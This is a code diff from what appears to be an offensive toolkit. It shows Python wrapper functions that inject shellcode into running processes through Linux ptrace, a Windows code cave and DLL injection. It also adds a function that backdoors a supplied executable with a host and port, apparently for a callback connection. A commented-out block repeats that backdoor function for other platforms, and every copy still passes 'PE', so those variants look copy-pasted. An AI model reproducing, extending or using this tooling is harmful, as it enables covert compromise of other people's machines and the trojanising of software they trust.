@@ -8,7 +8,7 @@ def linux64ptrace( pid, shellcode):
 
 
 def winx86Codecave( exe, shellcode):
-	from .Windowsx86.codecave import main
+	from .Windowsx86.codecaveinjector import main
 	main( exe, shellcode)
 
 
@@ -19,4 +19,35 @@ def winx86tLsDLL( exe, dll):
 def winDLL( pid, shellcode):
 	from .Windows.inject import qweqwe
 	qweqwe( pid, shellcode)
+
+
+def winBFD( FILE, HOST, PORT):
+	from .BFDBackdoors.backdoor import start
+	start("PE", FILE, HOST, PORT).patch()
+
+
+"""
+def MacBFD( FILE, HOST, PORT):
+	from .BFDBackdoors.backdoor import start
+	start("PE", FILE, HOST, PORT).patch()
+
+
+def LinuxBFD( FILE, HOST, PORT):
+	from .BFDBackdoors.backdoor import start
+	start("PE", FILE, HOST, PORT).patch()
+
+
+def LinuxARMx86BFD( FILE, HOST, PORT):
+	from .BFDBackdoors.backdoor import start
+	start("PE", FILE, HOST, PORT).patch()
+
+
+def FreeBSDx86( FILE, HOST, PORT):
+	from .BFDBackdoors.backdoor import start
+	start("PE", FILE, HOST, PORT).patch()
+"""
+
+
+
+
 
